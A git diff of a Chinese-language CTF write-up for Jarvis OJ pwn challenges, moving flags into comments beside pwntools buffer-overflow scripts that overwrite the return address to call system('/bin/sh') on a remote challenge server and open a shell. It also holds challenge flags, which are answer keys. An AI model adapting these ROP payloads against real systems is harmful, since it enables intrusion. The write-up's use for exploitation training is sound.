@@ -374,7 +374,7 @@
 
   填充buf，覆盖ebp，把返回地址改为system的地址，设置system的返回地址，传参给system
 
-  ```
+  ```python
   from pwn import *
   r = remote('pwn2.jarvisoj.com',9878)
   system =p32(0x8048320)
@@ -382,14 +382,10 @@
   payload = 'a'*(0x88+4) + system + p32(0) + binsh
   r.sendline(payload)
   r.interactive()
-  
+  #CTF{1759d0cbd854c54ffa886cd9df3a3d52}
   ```
 
    ![19](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/19.png)
-
-  `CTF{1759d0cbd854c54ffa886cd9df3a3d52}`
-
-  
 
 * #### [XMAN]level2(x64)
 
@@ -403,6 +399,7 @@
    payload = padding + p64(pop_rdi_ret) + p64(binsh) + p64(sys_addr)
    r.sendline(payload)
    r.interacctive()
+   #CTF{081ecc7c8d658409eb43358dcc1cf446}
    ```
 
    
@@ -487,7 +484,7 @@
    r.recvuntil('Input:\n')
    r.sendline(payload2)
    r.interactive()
-   
+   #CTF{b1aeaa97fdcc4122533290b73765e4fd}
    ```
 
    
